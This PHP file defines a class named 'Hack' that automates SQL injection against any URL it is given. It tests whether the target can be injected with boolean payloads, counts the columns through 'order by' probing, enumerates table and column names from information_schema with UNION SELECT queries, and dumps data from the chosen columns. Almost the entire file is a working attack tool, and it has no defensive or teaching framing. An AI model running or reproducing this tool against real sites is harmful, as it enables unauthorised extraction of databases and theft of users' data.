<?php
/**
 * 
 * @author rco
 *
 */

/** @var Hack hack */
$hack = new Hack();
$hack->action();

class Hack 
{
	/** @var string is hackable */
	const CHECK_IS_HACKABLE_ACTION 		= 'check_is_hackable_action';
	
	/** @var string how much action */
	const GET_HOW_MUCH_COLS_ACTION 		= 'get_how_much_cols_action';
	
	/** @var string get table name */
	const GET_TABLES_NAME_ACTION 		= 'get_tables_name_action';
	
	/** @var string get cols name */
	const GET_COLS_NAME_ACTION 			= 'get_cols_name_action';
	
	/** @var string get final data */
	const GET_FINAL_DATA_ACTION 		= 'get_final_data_action';
	
	/** @var string get log data */
	const GET_LOG_ACTION 				= 'get_log_action';
	
	/** @var string is hackable */
	const NBR_POTENTIAL_COL_ITERATION	= 50;
	
	/** @var string current action */
	protected $_action 					= "";
	
	/** @var string current url */
	protected $_url 					= "";
	
	/** @var string suffix  */
	protected $_suffix 					= "";
	
	/** @var string file name */
	protected $_filepath 				=  "/var/log/process.log";
	
	/**
	 * construct
	 */
	public function __construct()
	{
		$this->_filepath = dirname(__FILE__) . $this->_filepath;
	}
	
	/**
	 * action : main function
	 *
	 * @return string
	 */
	public function action()
	{
		if (!isset($_GET['action']) || !in_array($_GET['action'], $this->_getAvailablesAction())) {
			return $this->_sendResponse(array('error' => 'Action not available'));
		} 
		
		$this->_url 	= (isset($_GET['url'])) ? base64_decode($_GET['url']) : null; 
		
		if ($this->_url  === null || $this->_checkUrl($this->_url) !== 1) {
			return $this->_sendResponse(array('error' => 'Url is incorrect'));
		}
		
		$this->_action 	= $_GET['action'];
		
		$method 		= lcfirst(str_replace(' ','',ucwords(str_replace('_',' ', $this->_action))));
		
		if (method_exists($this, $method)) {
			$this->$method();
		} else {
			return $this->_sendResponse(array('error' => 'Method not available'));
		}
	}
	
	/**
	 * check Is Hackable
	 *
	 * @return string
	 */
	protected function checkIsHackableAction()
	{
		$data 				= array();
		$url 				= $this->_url . '+and+1=0--';
		$before 			= $this->_call($url);
		$url				= $this->_url . '+and+1=1--';
		$after 				= $this->_call($url);
		$data['success'] 	= (strlen($before) != strlen($after)) ? 1 : 0;
		$data['url_call'] 	= $url;
		
		return $this->_sendResponse($data);
	}
	
	/**
	 * get how Much Cols
	 *
	 * @return string
	 */
	protected function getHowMuchColsAction()
	{
		$nbrCols 	= 0;
		$data 		= array();

		for ($i=1;$i<=self::NBR_POTENTIAL_COL_ITERATION;$i++) {
			$url = $this->_url . '+order+by+' .$i.'--';
			$content = $this->_call($url);
			
			$this->_log('Search for col : ' . $i);
			
			if (strrpos($content, 'mysql_fetch_array()') !== false) {
				$nbrCols = $i - 1;
				$this->_log('FIND for col : ' . $nbrCols);
				break;
			}
		}
		
		$data['nbr_cols'] 	= $nbrCols;
		$data['url_call']	= $url;
		
		return $this->_sendResponse($data);
	}
	
	/**
	 * get Tables Name
	 * 
	 * @return string
	 */
	protected function getTablesNameAction()
	{
		$data 		= array();
		$errors 	= array();
		
		if (!isset($_GET['nbr_cols'])) {
			$errors['error'][] = 'Int for nbr cols is required';
		} 
		
		if (empty($errors)) {
			$nbrCols = $_GET['nbr_cols'];
			
			$cols = array();
			for ($i = 1; $i<=$nbrCols; $i++) {
				$cols[] = 'group_concat(distinct+table_name+order+by+table_name+asc)';
			}
			
			$url = preg_replace('#=([0-9]+)$#', '=-1', $this->_url) . '+union+select+' . implode(',', $cols) . '+from+information_schema.tables--';
			
			$content = utf8_encode($this->_call($url));
			
			$content = $this->_getUpperCaseInfo($content);
			
			$data['tables']	 	= $content;
			$data['url_call']	= $url;
			
			return $this->_sendResponse($data);
		}
		
		return $this->_sendResponse($errors);
	}
	
	/**
	 * get cols Name
	 * 
	 * @return string
	 */
	protected function getColsNameAction()
	{
		$errors = array();
		
		if (!isset($_GET['nbr_cols'])) {
			$errors['error'][] = 'Int for nbr cols is required';
		}
		
		if (!isset($_GET['table'])) {
			$errors['error'][] = 'Table name is required';
		}
	
		if (empty($errors)) {
			$tableName 	= $this->_asciiConvertor($_GET['table']);
			$nbrCols 	= $_GET['nbr_cols'];
			
			$cols = array();
			for ($i = 1; $i<=$nbrCols; $i++) {
				$cols[] = 'group_concat(column_name)';
			}
			
			$url = preg_replace('#=([0-9]+)$#', '=-1', $this->_url) . '+union+select+' . implode(',', $cols)
			. '+from+information_schema.columns+where+table_name='.$tableName.'--';
			
			$content = utf8_encode($this->_call($url));
			$content = $this->_getUpperCaseInfo($content);
			
			$data['columns'] 	= $content;
			$data['url_call'] 	= $url;
			
			return $this->_sendResponse($data);
		}
		return $this->_sendResponse($errors);
	}
	
	/**
	 * get final data
	 *
	 * @return string
	 */
	protected function getFinalDataAction()
	{
		$errors = array();
		
		if (!isset($_GET['nbr_cols'])) {
			$errors['error'][] = 'Int for nbr cols is required';
		}
	
		if (!isset($_GET['table'])) {
			$errors['error'][] = 'Table name is required';
		}
		
		if (!isset($_GET['col'])) {
			$errors['error'][] = 'Col name is required';		
		}
		
		if (empty($errors)) {
			
			$tableName 	= $_GET['table'];
			$nbrCols 	= $_GET['nbr_cols'];
			$colName	= explode(',',$_GET['col']);
			
			$cols = array();
			for ($i = 1; $i<=$nbrCols; $i++) {
				$z = $i - 1;
				
				if (!isset($colName[$z])) {
					$colName[$z] = $colName[0];
				}
				
				$cols[] = 'CONVERT('.$colName[$z].' USING utf8)';
			}
			
			$url = preg_replace('#=([0-9]+)$#', '=-1', $this->_url) . '+union+select+' . implode(',', $cols)
			. '+from+'.$tableName. $this->_getSuffixTable() . '--';
			
			$content = utf8_encode($this->_call($url));
			
			$data['content'] 	= $content;
			$data['url_call'] 	= $url;
			
			return $this->_sendResponse($data);
		}

		return $this->_sendResponse($errors);
	}
	
	/**
	 * get log
	 *
	 * @return string
	 */
	protected function getLogAction()
	{
		$data = array();
		$data['content'] = file_get_contents($this->_filepath);
		return $this->_sendResponse($data);
	}
	
	/**
	 * log
	 *
	 * @param unknown_type $msg
	 */
	private function _log($msg)
	{
		$fd = fopen($this->_filepath, "w");
		$str = "[" . date("Y/m/d h:i:s", mktime()) . "] " . $msg;
		fwrite($fd, $str . "\n");
		fclose($fd);
	}
	
	/**
	 * get suffix table
	 *
	 * @return string
	 */
	protected function _getSuffixTable()
	{
		return $this->_getSuffix('table');
	}
	
	/**
	 * set suffix table
	 * 
	 * @param string $suffix
	 * 
	 * @return Hack
	 */
	protected function _setSuffixTable($suffix)
	{
		return $this->_setSuffix($suffix, 'table');
	}
	
	/**
	 * set suffix
	 *
	 * @param string $suffix suffix
	 * @param string $key    key
	 * 
	 * @return Hack
	 */
	private function _setSuffix($suffix, $key)
	{
		$this->_suffix[$key] = $suffix;
		return $this;
	}
	
	/**
	 * get suffix
	 * 
	 * @param string $key
	 */
	private function _getSuffix($key)
	{
		return (isset($this->_suffix[$key])) ? $this->_suffix[$key] : "";
	}
	
	/**
	 * get uppercase info
	 *
	 * @return string
	 */
	private function _getUpperCaseInfo($content)
	{
		$result = "";
		$matches = array();
		
		if (preg_match_all("/([A-Za-z0-9_]+)([,]?)/", $content, $matches)) {
			foreach ($matches as $match) {
					foreach ($match as $data) {
					$result .= $data . '<br />';
				}
			}
		}
		return $result;
	}
	
	/**
	 * get available action
	 *
	 * @return array
	 */
	private function _getAvailablesAction()
	{
		return array (
			self::CHECK_IS_HACKABLE_ACTION,
			self::GET_HOW_MUCH_COLS_ACTION,
			self::GET_TABLES_NAME_ACTION,
			self::GET_COLS_NAME_ACTION,
			self::GET_FINAL_DATA_ACTION,
		);
	}
	
	/**
	 * get string convert into ascii char
	 * 
	 * @param string $string string to convert
	 * 
	 * @return string
	 */
	private function _asciiConvertor($string)
	{
		$convertors = array();
		
		for ($i = 0; $i<strlen($string); $i++) {
			$convertors[] = ord($string[$i]);
		}
		
		return 'char(' . implode(',', $convertors) . ')';
	}
	
	/**
	 * check url
	 *
	 * @param string $url url to check
	 *
	 * @return boolean
	 */
	private function _checkUrl($url)
	{
		return preg_match("/\b(?:(?:https?|ftp):\/\/|www\.)[-a-z0-9+&@#\/%?=~_|!:,.;]*[-a-z0-9+&@#\/%=~_|]/i", $url);
	}
	
	/**
	 * send response
	 * 
	 * @param array $data data to send
	 * 
	 * @return void
	 */
	protected function _sendResponse($data)
	{
		header('Content-Type: application/json');
		
		$data = json_encode($data);
		
		if ($data === false) {
			throw new Exception('Json encode failed, error ID : ' . json_last_error());
		}
		
		echo $data;	
		exit();	
	}
	
	/**
	 * call distant page via http
	 *
	 * @param string $url url to call
	 *
	 * @return string
	 */
	private function _call($url)
	{
		return strip_tags(file_get_contents($url));
	}
}